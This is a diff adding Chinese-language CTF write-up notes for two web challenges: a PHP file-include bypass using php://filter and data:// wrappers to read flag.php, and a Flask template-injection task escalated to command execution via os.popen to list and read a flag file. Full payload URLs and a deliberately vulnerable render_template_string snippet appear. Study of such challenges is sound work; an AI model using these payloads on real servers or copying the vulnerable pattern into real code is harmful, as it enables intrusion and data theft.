@@ -166,3 +166,57 @@ base64_encode(string): 使用 MIME base64 对数据进行编码
    echo decode($miwen);     
 ?> 
 运行得到flag
+2026.1.12
+1.fileclude（伪协议绕过）
+查看源代码，改url为flag.php
+出现错误，发现file1 和file2都需要传参
+file_get_contents函数可以使用php伪协议绕过
+Payload:
+?file1=php://filter/read=convert.base64-encode/resource=flag.php&file2=data://text/plain;base64,aGVsbG8gY3Rm     
+#php://filter:读取源代码并进行base64编码输出        
+#data://:自PHP>=5.2.0起，可以使用data://数据流封装器，以传递相应格式的数据。通常可以用来执行PHP代码。一般需要用到base64编码传输
+得到base64的flag
+解密base64
+2.python template injection模板注入
+模板文件（如`html`）可以直接使用`python template injection`命令来调用
+模板注入，就是指**将一串指令代替变量传入模板中让它执行**
+```python
+def test():
+code = request.args.get('id')
+html = '''
+<h3>%s</h3>
+'''%(code)
+return render_template_string(html)
+```
+以这段代码为例，我们在传入`code`值时，可以用`{{}}`符号来包裹一系列代码，以此替代本应是参数的`id`：
+```
+http://..../?id={{代码}}
+```
+思路：首先进行模板注入的测试`http://111.198.29.45:46675/{{7*7}}`
+可以注入
+题目告诉我们这是一个python注入问题，那么脚本肯定也是python的，思
+考怎样用python语句获取控制台权限：想到了`os.system`和`os.popen` ([参考资
+料](https://blog.csdn.net/sxingming/article/details/52071514)),这两句前者返回**退出状态码** ,后者**以file形式**返回**输出内容**,我们想要的是内容，所以选择`os.popen`
+-__class__：返回对象所属的类
+__mro__：返回一个类所继承的基类元组，方法在解析时按照元组的
+顺序解析。
+__base__：返回该类所继承的基类
+// __base__和__mro__都是用来寻找基类的
+__subclasses__：每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
+__init__：类的初始化方法
+__globals__：对包含函数全局变量的字典的引用-首先，找到当前变量所在的类：
+`111.198.29.45:46675/%7B%7B''.__class__%7D%7D`
+服务器回复：
+`URL http://111.198.29.45:46675/<type 'str'> not found`
+发现这个回复里已经告诉我们这个变量的类是'str'了。
+-接下来，从这个类找到它的基类：
+`http://111.198.29.45:46675/%7B%7B''.__class__.__mro__%7D%7D`
+服务器回复：
+`URL http://111.198.29.45:46675/(<type 'str'>, <type 'basestring'>, <type 'object'>) not found`
+-然后，通过基类来找其中任意一个基类的引用列表：
+`http://111.198.29.45:46675/%7B%7B''.__class__.__mro__[2].__subclasses__()%7D%7D`
+服务器回复了很长的一个列表，从其中可以找到我们想要的`os`所在的`site._Printer`类，它在列表的第七十二位，即`__subclasses__()[71]`。-通过`__subclasses__()[71].__init__.__globals__['os'].popen('命令行语句').read()`来**调用服务器的控制台** **并显示**，这下我们就可以随便用控制台输出了。
+直接填命令语句：
+`http://111.198.29.45:46675/%7B%7B''.__class__.__mro__[2].__sub
+classes__()[71].__init__.__globals__['os'].popen('ls').read()%7D%7D`
+找到了一个fl4g index.py文件，运行cat命令查看该文件(把popen括号后的ls改为cat fl4g)   找到flag
